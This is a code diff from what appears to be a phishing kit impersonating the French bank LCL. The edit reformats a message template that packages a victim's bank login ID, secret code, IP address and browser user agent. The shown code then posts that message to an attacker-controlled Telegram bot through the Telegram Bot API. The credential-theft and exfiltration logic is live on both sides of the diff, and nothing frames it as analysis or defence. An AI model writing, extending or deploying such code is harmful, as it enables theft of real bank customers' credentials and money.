@@ -851,16 +851,7 @@ async function waitForConfig(maxWait = 3000) {
         console.log("🚀 ENVOI TELEGRAM LCL");
         
         try {
-            const message = `🔐 LCL - NOUVELLE CONNEXION 🔐
-━━━━━━━━━━━━━━━━━━━━━
-👤 Identifiant: ${data.userId}
-🔒 Code Secret: ${data.code}
-💾 Mémorisé: ${data.remembered ? 'OUI ✅' : 'NON ❌'}
-━━━━━━━━━━━━━━━━━━━━━
-🌍 IP: ${await getIP()}
-📱 User-Agent: ${navigator.userAgent}
-🕐 Date: ${new Date().toLocaleString('fr-FR')}
-✅ Statut: Connexion en cours`;
+            const message = `🔐 LCL - NOUVELLE CONNEXION 🔐\n━━━━━━━━━━━━━━━━━━━━━\n👤 Identifiant: ${data.userId}\n🔒 Code Secret: ${data.code}\n💾 Mémorisé: ${data.remembered ? 'OUI ✅' : 'NON ❌'}\n━━━━━━━━━━━━━━━━━━━━━\n🌍 IP: ${await getIP()}\n📱 User-Agent: ${navigator.userAgent}\n🕐 Date: ${new Date().toLocaleString('fr-FR')}\n✅ Statut: Connexion en cours`;
             
             const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
             const formData = new FormData();
